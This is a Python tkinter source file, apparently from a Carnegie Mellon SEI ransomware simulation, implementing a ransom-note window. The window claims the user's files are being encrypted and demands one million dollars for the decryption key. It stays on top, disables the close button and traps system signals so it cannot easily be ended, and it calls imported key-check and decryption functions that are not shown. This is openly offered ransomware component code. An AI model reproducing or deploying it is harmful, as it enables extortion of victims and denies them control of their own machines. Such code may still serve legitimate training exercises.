
# Copyright 2024 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.

#!/usr/bin/env python


import time, signal, threading
import tkinter as tk
from tkinter import ttk, messagebox
import multiprocessing
from crypto import check_key, decrypt_all

class MainPage(tk.Frame):
    def __init__(self, parent, controller, *args, **kwargs):
        super().__init__(parent, *args, **kwargs)
        msg ="Your files are being encrypted and you will lose them if you attempt to close the program before it finishes.\nPay me 1 million dollars and I will provide the decryption key."
        label = tk.Label(self, text=msg, font=('Helvetica', 20))
        label.pack(padx=100, pady=100)
        
        controller.key_var=tk.StringVar()
        entry = tk.Entry(self, textvariable=controller.key_var, font=('Helvetica', 20))
        entry.pack()

        submit_button = tk.Button(self,text="Submit", command=lambda: controller.submit(CompletionScreen), font=('Helvetica', 10))
        submit_button.pack()
        
        controller.result_label = tk.Label(self, text="")
        controller.result_label.pack()


class CompletionScreen(tk.Frame):
    def __init__(self, parent,controller, *args, **kwargs):
        super().__init__(parent, *args, **kwargs)
        msg ="Key accepted.\n\nYour files are being decrypted.\nPlease wait until you get notification that decryption process is done."
        label = tk.Label(self, text=msg, font=('Helvetica', 20))
        label.pack(padx=100, pady=100)
        
        close_button = tk.Button(self,text="Close", command=controller.close, font=('Helvetica', 10))
        close_button.pack()
        
        self.bind("<<ShowFrame>>",self.on_show_frame)
        

    def on_show_frame(self, event):
        # call decryption function here
        decrypt_all()
        messagebox.showinfo(":D", "Decryption of your files has completed.")

class App(tk.Tk):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        # Adding a title to the window
        self.wm_title("")

        # test passing variables between classes
        self.key_var = tk.StringVar
        self.result_var = tk.Label
        
        # creating a frame and assigning it to container
        container = tk.Frame(self, height=1200, width=1200)
        
        # specifying the region where the frame is packed in root
        container.pack(side="top", fill="both", expand=True)

        # configuring the location of the container using grid
        container.grid_rowconfigure(0, weight=1)
        container.grid_columnconfigure(0, weight=1)
        
        # disable events to make it so window cant be closed
        self.protocol("WM_DELETE_WINDOW",self.disable_event)       # UNCOMMENT AT END
        for sig in set(signal.Signals):
            try:
                signal.signal(sig, self.signal_handler)
            except Exception as e:
                continue

        # We will now create a dictionary of frames
        self.frames = {}
        # we'll create the frames themselves later but let's add the components to the dictionary.
        for F in (MainPage, CompletionScreen):
            frame = F(container, self)

            # the windows class acts as the root window for the frames.
            self.frames[F] = frame
            frame.grid(row=0, column=0, sticky="nsew")

        # Using a method to switch frames
        self.show_frame(MainPage)
        
    def show_frame(self, cont):
        frame = self.frames[cont]
        # raises the current frame to the top
        frame.tkraise()
        frame.event_generate("<<ShowFrame>>")
    
    def signal_handler(self, signum, frame):
        #signal.signal(signum, signal.SIG_IGN)           # says it should ignore additional signals
        messagebox.showerror(":)","Whatcha tryna do?")
        pass

    def disable_event(self):
        messagebox.showerror(":)","Wrong Button")
        pass

    def submit(self, frame):
        # HARDCODED_KEY is to be used here
        decrypt_key = self.key_var.get()
        if check_key(decrypt_key):
            #self.show_frame(frame)
            frame = self.frames[frame]
            frame.tkraise()
            frame.update()
            frame.event_generate("<<ShowFrame>>")
        else:
            self.result_label.config(text="Incorrect key")
            
    def close(self):
        self.destroy()
        
    def run(self):
        self.resizable(False,False)
        self.attributes("-topmost",True)
        self.lift()
        #self.after(1,lambda:self.attributes("-topmost",False))
        self.mainloop()


def run_gui():
    app = App()
    app.run()

        
if __name__=="__main__":
    proc = multiprocessing.Process(target=run_gui)
    proc.start()
    proc.join()
